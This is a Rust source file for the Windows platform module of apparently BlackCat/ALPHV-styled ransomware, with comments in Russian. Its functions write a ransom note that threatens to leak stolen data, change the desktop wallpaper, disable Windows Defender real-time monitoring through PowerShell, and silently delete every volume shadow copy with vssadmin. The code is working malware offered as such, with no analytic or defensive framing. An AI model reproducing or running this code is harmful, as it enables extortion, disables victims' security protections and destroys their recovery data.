// src/windows.rs
use std::process::Command;
#[cfg(target_os = "windows")]
use std::ffi::OsStr;
#[cfg(target_os = "windows")]
use std::os::windows::ffi::OsStrExt;
#[cfg(target_os = "windows")]
use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};
#[cfg(target_os = "windows")]
use std::ptr;

pub struct WindowsPlatform;

impl WindowsPlatform {
    #[cfg(target_os = "windows")]
    pub fn create_ransom_note(save_dir: &str, exfil_report: &str) -> Result<(), String> {
        let ransom_content = format!(
r#"-->> BLACKCAT/ALPHV RANSOMWARE <<--

Your important files have been ENCRYPTED and now have ".sttp" extension.

YOUR DATA HAS BEEN EXFILTRATED!
All sensitive data from your system has been downloaded to our servers.

If you refuse to pay, all data will be PUBLISHED on our leak site.

EXFILTRATED DATA REPORT:
{}

Recovery procedure:
1. Download and install Tor Browser: https://torproject.org/
2. Navigate to: http://blackcat-site.onion/
3. Enter your personal decryption key provided below.

=== DO NOT SHARE THIS KEY WITH ANYONE ===
"#, exfil_report);

        let note_path = format!("{}\\README_BLACKCAT.txt", save_dir);
        std::fs::write(&note_path, ransom_content)
            .map_err(|e| format!("Failed to create ransom note: {}", e))?;
        Ok(())
    }

    // НОВАЯ ФУНКЦИЯ: Смена обоев
    #[cfg(target_os = "windows")]
    pub fn set_wallpaper(path: &str) -> Result<(), String> {
        // Преобразуем путь в Wide String (UTF-16) для WinAPI
        let wide_path: Vec<u16> = OsStr::new(path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        unsafe {
            let result = SystemParametersInfoW(
                SPI_SETDESKWALLPAPER,
                0,
                wide_path.as_ptr() as *mut _,
                SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
            );

            if result != 0 {
                Ok(())
            } else {
                Err("SystemParametersInfoW failed".to_string())
            }
        }
    }

    #[cfg(target_os = "windows")]
    pub fn disable_windows_defender() -> Result<(), String> {
        let _ = Command::new("powershell")
            .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
            .output();
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn delete_shadow_copies() -> Result<(), String> {
        let _ = Command::new("cmd").args(&["/c", "vssadmin delete shadows /all /quiet"]).output();
        Ok(())
    }

    // Заглушки для Linux
    #[cfg(not(target_os = "windows"))]
    pub fn create_ransom_note(_: &str, _: &str) -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn set_wallpaper(_: &str) -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn disable_windows_defender() -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn delete_shadow_copies() -> Result<(), String> { Ok(()) }
}